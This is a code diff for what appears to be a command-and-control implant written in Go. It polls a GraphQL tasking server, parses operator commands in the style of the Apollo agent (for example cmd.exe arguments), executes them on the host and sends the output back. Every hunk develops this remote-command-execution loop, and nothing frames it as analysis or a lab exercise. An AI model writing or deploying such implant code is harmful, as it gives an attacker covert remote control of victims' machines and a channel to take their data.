@@ -12,6 +12,7 @@ import (
         "os/exec"
         "os/user"
         "runtime"
+        "strconv"
         "strings"
         "syscall"
         "time"
@@ -370,8 +371,14 @@ func getSystemInfo() string {
 func sendTaskResponse(taskID string, output string) error {
         logEvent(fmt.Sprintf("Sending response for task %s", taskID))
         
+        // Convert taskID to integer
+        taskIDInt, err := strconv.Atoi(taskID)
+        if err != nil {
+                return fmt.Errorf("Invalid task ID: %v", err)
+        }
+        
         query := `
-        mutation updateTaskOutput($task_id: String!, $response: String!) {
+        mutation updateTask($task_id: Int!, $output: String!) {
                 update_task_by_pk(pk_columns: {id: $task_id}, _set: {
                         status: "completed",
                         completed: true,
@@ -381,15 +388,15 @@ func sendTaskResponse(taskID string, output string) error {
                 }
                 insert_response_one(object: {
                         task_id: $task_id,
-                        response: $response
+                        response: $output
                 }) {
                         id
                 }
         }`
         
         variables := map[string]interface{}{
-                "task_id":  taskID,
-                "response": output,
+                "task_id": taskIDInt,
+                "output":  output,
         }
         
         resp, err := makeGraphQLRequest(query, variables)
@@ -399,6 +406,8 @@ func sendTaskResponse(taskID string, output string) error {
         
         if len(resp.Errors) > 0 {
                 logEvent(fmt.Sprintf("Response send errors: %v", resp.Errors))
+        } else {
+                logEvent("Response sent successfully")
         }
         
         return nil
@@ -447,14 +456,23 @@ func checkForTasks() error {
         if data, ok := resp.Data["task"].([]interface{}); ok && len(data) > 0 {
                 for _, taskData := range data {
                         if taskMap, ok := taskData.(map[string]interface{}); ok {
-                                taskID := taskMap["id"].(string)
-                                commandName := taskMap["command_name"].(string)
-                                params := ""
-                                if p, ok := taskMap["params"].(string); ok {
-                                        params = p
+                                taskID := fmt.Sprintf("%v", taskMap["id"])
+                                
+                                // Get command name from command object
+                                commandName := ""
+                                if cmd, ok := taskMap["command"].(map[string]interface{}); ok {
+                                        if cmdStr, ok := cmd["cmd"].(string); ok {
+                                                commandName = cmdStr
+                                        }
                                 }
                                 
-                                logEvent(fmt.Sprintf("Processing task %s: %s", taskID, commandName))
+                                // Parse Apollo-style parameters
+                                params := ""
+                                if p, ok := taskMap["params"].(string); ok {
+                                        params = parseApolloParams(p)
+                                }
+                                
+                                logEvent(fmt.Sprintf("Processing task %s: %s with params: %s", taskID, commandName, params))
                                 
                                 output := executeCommand(commandName, params)
                                 
@@ -471,6 +489,24 @@ func checkForTasks() error {
         }
         
         return nil
+}
+
+func parseApolloParams(jsonParams string) string {
+        // Parse Apollo-style JSON parameters like {"executable": "cmd.exe", "arguments": " /S /c ls"}
+        var params map[string]interface{}
+        err := json.Unmarshal([]byte(jsonParams), &params)
+        if err != nil {
+                return jsonParams // Return original if not JSON
+        }
+        
+        // Extract the actual command from Apollo format
+        if args, ok := params["arguments"].(string); ok {
+                // Remove "/S /c " prefix and return the actual command
+                command := strings.TrimPrefix(args, " /S /c ")
+                return command
+        }
+        
+        return jsonParams
 }
 
 func main() {
